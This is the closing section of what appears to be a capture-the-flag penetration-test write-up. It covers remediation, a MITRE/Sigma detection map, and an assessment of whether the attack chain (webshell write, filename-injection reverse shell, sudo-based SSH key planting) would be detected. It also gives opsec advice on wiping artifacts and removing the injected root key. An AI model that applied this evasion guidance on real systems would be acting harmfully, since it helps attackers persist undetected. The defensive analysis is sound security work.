3. Clean up `/tmp/rootkey.pub`, `/tmp/authorized_keys`, and `/tmp/custom_server.py` immediately after SSH access is established: reduces the persistent artifact count but does not remove the auth.log, auditd, or FIM entries already written.
4. The write to `/root/.ssh/authorized_keys` is intrinsic to this technique: no bypass eliminates it. The only operational approach is speed: execute, establish SSH access, and remove the injected key entry from `authorized_keys` immediately after confirming persistent access through another mechanism.

**Remediation:**
1. Remove the `install_validator.py` wildcard sudo permission: there is no operational justification for a standard user to invoke an arbitrary URL downloader as root.
2. If the installer is operationally necessary, restrict it to approved URL prefixes and a fixed output directory: never derive the write path from the URL path component.
3. Deploy file integrity monitoring on `/root/.ssh/`: any modification to `authorized_keys` by a non-interactive root process must trigger an immediate high-severity alert.
4. Alert on outbound HTTP connections initiated by root-context processes: legitimate server software does not phone home to external IPs during normal operation.

**OpSec Rating:** Loud: writing to `/root/.ssh/authorized_keys` via a sudo-privileged script generates file integrity, auth.log, and network artifacts that are permanently recorded and detectable at multiple layers. The auth.log entry preserves the full URL argument including the encoded destination path as permanent forensic evidence of the technique used.

---

## Flags

| | |
|---|---|
| User | `cat /home/steve/user.txt` |
| Root | `cat /root/root.txt` |

---

## Detection Map

| Step | MITRE | Log Source | Sigma Rule | OpSec |
|---|---|---|---|---|
| Port scan | T1046 | Network / firewall | proc_creation_lnx_susp_nmap.yml | Loud |
| Subdomain enumeration | T1595.003 | nginx access log | web_scan_generic_product.yml | Moderate |
| Portal web enumeration | T1083 | nginx access log | web_scan_generic_product.yml | Moderate |
| .git repository dump | T1552.001 / T1213 | nginx access log | web_scan_generic_product.yml | Moderate |
| Portal auth (gitbot) | T1078 | nginx access log |: | Silent |
| GHSA-768j-98cg-p3fv webshell write | T1190 | nginx log, FIM, network | file_creation_lnx_web_shell.yml | Loud |
| CVE-2024-25082 ZIP filename injection | T1190 | auditd, EDR, network | proc_creation_lnx_reverse_shell.yml | Loud |
| Sudo enumeration | T1069 | /var/log/auth.log | lnx_sudo_privilege_enumeration.yml | Silent |
| install_validator.py SSH key write | T1548.003 / T1098.004 | auth.log, FIM, network | lnx_ssh_authorized_keys_modification.yml | Loud |

---

## Would I Get Caught

**Assumed environment:** Default Debian installation running nginx, PHP, and standard system utilities. No WAF, no EDR agent, no auditd rules beyond defaults, no SIEM. Standard nginx access log and auth.log only. No file integrity monitoring on the web root or `/root/.ssh/`.

**Verdict:** No. The entire chain executes without a single real-time alert. The nginx access log contains the full designspace upload, the webshell access with `cmd=` parameters, and every git-dump object request: all in plaintext, and nothing monitors it in real time. The write to `/root/.ssh/authorized_keys` is the most consequential single event and is completely invisible in a default configuration.

**The single control that breaks the entire chain:** Blocking `.git/` access at the nginx level. Without repository access, `gitbot`'s credentials are never recovered. Without portal authentication, the designspace upload endpoint is never reached. Without the designspace upload, the fonttools arbitrary file write is unavailable. Every downstream step: webshell, `www-data` shell, fontforge injection, `steve` shell, sudo escalation: depends on the portal access that the leaked credential enables. A one-line nginx configuration change (`location ~ /\. { deny all; }`) eliminates the entire attack path at the source.

**Where a tuned environment catches this operation:**

File integrity monitoring on `/var/www/` would alert the moment `shell.php` is written by the fonttools process: before it is ever browsed. This is the first viable real-time detection point. If missed, the write to `/root/.ssh/authorized_keys` by the root Python process is the second detection point: FIM on `/root/.ssh/` is a standard hardening baseline and generates an immediate high-severity alert that no reasonable security programme would leave unmonitored.

**What remains undetectable regardless of environment:**

The `.git/` repository dump generates only nginx access log entries: detectable in log analysis but producing no real-time alert without a specific monitoring rule. Portal authentication with the leaked credential generates one access log entry indistinguishable from legitimate bot access. MD5-equivalent hash cracking (not applicable here: credentials were in plaintext in the commit) is entirely offline. Sudo enumeration with `sudo -l` generates one low-severity auth.log entry no default rule monitors independently. The noisy phases of this operation are the webshell delivery and the SSH key injection: exactly where FIM controls are most effective.
